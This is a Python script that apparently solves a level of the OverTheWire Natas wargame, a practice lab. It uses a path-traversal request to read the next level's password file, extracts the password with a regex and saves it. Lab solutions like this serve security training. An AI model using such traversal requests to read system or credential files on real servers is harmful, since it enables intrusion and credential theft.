import requests
import re
from natas_utility import *
import html

current_level = 7
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

session = requests.session()

url = base_url + '/index.php?page=../../../../etc/natas_webpass/natas8'

response = session.get(url, auth=auth)

content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n')
cookies = response.cookies

# print(content)

password_regex = re.compile(r'<br>\n<br>\n(.+)')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
